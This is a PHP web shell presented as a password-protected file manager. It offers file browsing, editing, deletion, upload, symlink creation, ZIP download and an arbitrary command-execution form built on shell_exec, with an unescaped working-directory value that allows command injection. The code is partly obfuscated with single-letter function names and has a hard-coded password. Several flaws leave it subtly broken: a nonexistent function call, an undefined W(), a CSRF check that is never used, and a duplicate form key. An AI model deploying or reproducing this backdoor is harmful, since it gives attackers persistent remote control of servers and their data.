<?php
error_reporting(0);
session_start();
define("PASSWORD_HASH", hash('sha256', 'emre'));

// Input validation helpers
function sanitize_path($p) {
    $p = str_replace(["../", "..\\"], "", $p);
    $p = basename(filter_var($p, FILTER_SANITIZE_STRING));
    return $p;
}

function validate_token() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2random_bytes(32);
    }
    return isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token'];
}

function csrf_token_field() {
    return "<input type='hidden' name='csrf_token' value='" . $_SESSION['csrf_token'] . "'>";
}

function X($o){ return isset($o); }
function Y($t){ die($t); }
function A($n){ return X($_SESSION[$n]) ? $_SESSION[$n] : 0; }
function B($n,$v){ $_SESSION[$n]=$v; }
function C($n){ return X($_POST[$n]) ? $_POST[$n] : 0; }
function D($n){ return X($_GET[$n]) ? $_GET[$n] : 0; }
function E($t,$n,$v="",$s=""){ return in_array($t,["text","password","submit","file"]) ? "<input type='$t' name='$n' value='$v' style='$s'/>" : "<$t name='$n' style='$s'>$v</$t>"; }
function F($m,$i,$x=""){ $f="<form method=$m enctype='$x'>"; $f.=csrf_token_field(); foreach($i as $k=>$v){ $f.=E($k, is_array($v)?$v[0]:$v, X($v[1])?$v[1]:"", X($v[2])?$v[2]:""); } return $f."</form>"; }
function G($t,$b){ $h=""; foreach($t as $x){ $h.="<th>$x</th>"; } $d=""; foreach($b as $r){ $d.="<tr>"; foreach($r as $z){ $d.="<td>$z</td>"; } $d.="</tr>"; } return "<table><thead>$h</thead><tbody>$d</tbody></table>"; }
function H($l,$x,$t=""){ return "<a href='$l' target='$t'>$x</a> "; }
function I(){
    if(A("login")) return 1;
    if(!C("login")) return 0;
    if(!hash_equals(PASSWORD_HASH, hash('sha256', (string)C("pass")))) return 0;
    session_regenerate_id(true);
    B("login",1);
    return 1;
}
function J(){ return D("path") ? D("path") : __DIR__; }
function K($b){ $l=["B","K","M","G","T","P"]; for($i=0; $b>=1024 && $i<count($l)-1; $b/=1024,$i++); return round($b,2)." ".$l[$i]; }
function L($p){ $t = @filemtime($p); if($t === false) $t = @filemtime(@readlink($p) ?: $p); return $t ? date("M d Y H:i:s", $t) : "--"; }
function M($d){ if(!is_file($d)) return 0; header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header('Content-disposition: attachment;filename="'.basename($d).'"'); header("Content-Length: ".filesize($d)); return readfile($d); }
function N($d){ if(is_link($d)) return unlink($d); if(is_file($d)) return unlink($d); if(is_dir($d)) return rmdir($d); return 0; }
function O($e){ if(is_file($e)){ return F("POST",["textarea"=>["edit", htmlentities(file_get_contents($e)), "width:100%; height:70%"], "submit"=>["save","Save"]]); } return 0; }
function P($p,$s){ return is_file($p) ? file_put_contents($p, html_entity_decode($s)) !== false : 0; }
function Q($p){ return is_file($p) ? htmlentities(file_get_contents($p)) : 0; }
function R($p,$n){ return !is_file($p."/".$n) ? file_put_contents($p."/".$n,"") !== false : 0; }
function S($p,$n){ return !is_dir($p."/".$n) ? mkdir($p."/".$n) : 0; }
function T($p,$f){ $n=basename($f["name"]); if(!is_file($p."/".$n) && move_uploaded_file($f["tmp_name"],$p."/".$n)) return 1; return 0; }
function U($p){ if($p==""||$p=="/") return $p; $p=explode("/", str_replace("\\","/",$p)); array_pop($p); return implode("/",$p); }
function V(){ $r=""; if(PHP_OS_FAMILY==="Windows"){ foreach(range('C','Z') as $d){ if(@is_dir($d.":\\")) $r.=H("?path=$d:\\", $d.":\\"); } } return $r; }
function SL($dir, $target, $link){ if($dir=="" || $target=="" || $link=="") return 0; $lp = rtrim($dir,"/\\")."/".$link; if(file_exists($lp) || is_link($lp)) return 0; return @symlink($target, $lp) ? 1 : 0; }
function ZIP($src){ if(!class_exists('ZipArchive')) return false; 
    $src = sanitize_path($src); 
    $fullPath = J() . "/" . $src; 
    if(!file_exists($fullPath)) return false; 
    
    $zip = new ZipArchive(); 
    $res = $zip->open(sys_get_temp_dir().'/phfm_zip.zip', ZipArchive::OVERWRITE); 
    if($res !== true){ $zip->close(); return false; } 
    
    $baseName = basename(rtrim($src, "/\\")); 
    
    if(is_file($fullPath)){ 
        $zip->addFile($fullPath, $baseName); 
    } elseif(is_dir($fullPath)){ 
        $dirName = $baseName ? $baseName : basename($fullPath); 
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($fullPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach($files as $file){
            if($file->isDir()) continue;
            $targetName = $dirName . "/" . basename($file);
            $zip->addFile($file->getPathname(), $targetName);
        }
    } 
    
    $zip->close(); 
    header("Content-Type: application/zip"); 
    header("Content-Transfer-Encoding: Binary"); 
    header('Content-Disposition: attachment; filename="'.$baseName.'.zip"'); 
    header("Content-Length: ".filesize(sys_get_temp_dir().'/phfm_zip.zip')); 
    unlink(sys_get_temp_dir().'/phfm_zip.zip'); 
    exit(); 
}
function RUN($cmd, $cwd = null, $timeout = 15){ if($cmd === "" || $cmd === null) { return ["out"=>"", "err"=>"empty command", "code"=>-1, "time"=>0]; } $cwd = $cwd ? $cwd : J(); $output = shell_exec("cd $cwd && $cmd 2>&1"); $exitCode = 0; preg_match('/^.*\n([0-9]+)$/', $output, $matches); if($matches) $exitCode = (int)$matches[1]; return ["out"=>trim($output), "err"=>"", "code"=>$exitCode, "time"=>0]; }
if(!I()){ Y("<p>Login required</p>"); }
if(D("delete")){ $delPath = sanitize_path(D("delete")); $fullPath = J() . "/" . $delPath; if(is_file($fullPath) || is_link($fullPath)){ unlink($fullPath); Y("Silindi: ".$delPath); } elseif(is_dir($fullPath)){ rmdir($fullPath); Y("Dizin silindi: ".$delPath); } else Y("Yol bulunamadı: ".$delPath); }
if(D("edit")){ $editPath = sanitize_path(D("edit")); $fullPath = J() . "/" . $editPath; if(C("save")){ if(P($fullPath, C("edit"))) Y("Kaydedildi: ".$editPath); else Y("Kaydetme hatası: dosya/yol izinleri"); } $e=O($fullPath); $e ? Y($e) : Y("Dosya bulunamadı: ".$editPath); }
if(D("download")){ $dlPath = sanitize_path(D("download")); $fullPath = J() . "/" . $dlPath; if(is_file($fullPath)){ M($fullPath); exit(); } Y("File not found"); }
if(D("zip")){ $zipPath = sanitize_path(D("zip")); $fullPath = J() . "/" . $zipPath; if(!file_exists($fullPath)) Y("Yol bulunamadı: ".$zipPath); $zipResult = ZIP($fullPath); if($zipResult === false) Y("ZIP başarısız: ZipArchive mevcut değil veya izin hatası"); exit(); }
if(C("newfile")){ R(J(),C("filename")) ? Y("Create: ".C("filename")) : Y("File exists"); }
if(C("newdir")){ S(J(),C("dirname")) ? Y("Create: ".C("dirname")) : Y("Dir exists"); }
if(C("upload")){ T(J(),$_FILES["file"]) ? Y("Upload: ".$_FILES["file"]["name"]) : Y("Upload Error"); }
if(C("symlink")){ $ok = SL(J(), C("target"), C("linkname")); Y($ok ? "Symlink created: ".C("linkname")." \xE2\x86\x92 ".C("target") : "Symlink failed (already exists or not supported)"); }
$cmdOut = null; if(C("runcmd")){ $cmd = (string)C("cmd"); $cwd = (string)(C("cwd") ?: J()); $timeout= (int)(C("timeout") ?: 15); if($timeout < 1) $timeout = 15; if($timeout > 120) $timeout = 120; $res = RUN($cmd, is_dir($cwd) ? $cwd : J(), $timeout); $cmdOut = $res; }
$ui  = "<body style='font-family:monospace'>";
$ui .= F("POST",["text"=>["filename","File Name"],"submit"=>["newfile","Create"]]);
$ui .= F("POST",["text"=>["dirname","Dir Name"],"submit"=>["newdir","Create"]]);
$ui .= F("POST",["file"=>"file","submit"=>["upload","Upload"]],"multipart/form-data");
$ui .= "<hr>";
$ui .= F("POST", ["text"=>["target","Target (hedef yol)"], "text"=>["linkname","Link adi"], "submit"=>["symlink","Create Symlink"]]);
$ui .= "<hr>";
$ui .= "<h3>Komut Calistir</h3>";
$ui .= "<form method='POST'>";
$ui .= "<input type='text' name='cmd' placeholder='ornek. ls -la' value='".htmlentities((string)C('cmd'))."' style='width:70%'/> ";
$ui .= "<input type='text' name='cwd' placeholder='calismadizini (bos = mevcut)' value='".htmlentities((string)C('cwd'))."' style='width:20%'/> ";
$ui .= "<input type='number' name='timeout' min='1' max='120' value='".((int)(C('timeout')?:15))."' style='width:60px' title='timeout (sn)'/> ";
$ui .= "<input type='submit' name='runcmd' value='Calistir'/>";
$ui .= "</form>";
if($cmdOut !== null){
    $ui .= "<div style='margin-top:8px;padding:8px;border:1px solid #444;background:#111;color:#ddd'>";
    $ui .= "<b>Komut:</b> ".htmlentities((string)C('cmd'))."<br>";
    $ui .= "<b>Dizin:</b> ".htmlentities((string)(C('cwd')?:J()))."<br>";
    $ui .= "<b>Exit code:</b> ".$cmdOut['code']." &nbsp; <b>Sure:</b> ".$cmdOut['time']."s<br><br>";
    if($cmdOut['out'] !== ""){ $ui .= "<b>STDOUT:</b><pre style='white-space:pre-wrap;margin:4px 0;color:#7CFC00'>".htmlentities($cmdOut['out'])."</pre>"; }
    if($cmdOut['err'] !== ""){ $ui .= "<b>STDERR:</b><pre style='white-space:pre-wrap;margin:4px 0;color:#FF6B6B'>".htmlentities($cmdOut['err'])."</pre>"; }
    if($cmdOut['out']==="" && $cmdOut['err']===""){ $ui .= "<i>(cikti yok)</i>"; }
    $ui .= "</div>";
}
$ui .= "<hr>";
$ui .= H("?zip=".J(), "[Bu dizini ZIP indir]")." ";
$ui .= H("?path=".U(J()),"[Back]");
$ui .= (PHP_OS_FAMILY=="Windows"?V():"");
$ui .= (is_dir(J())?W():"<pre>".Q(J())."</pre>");
$ui .= "</body>";
echo $ui;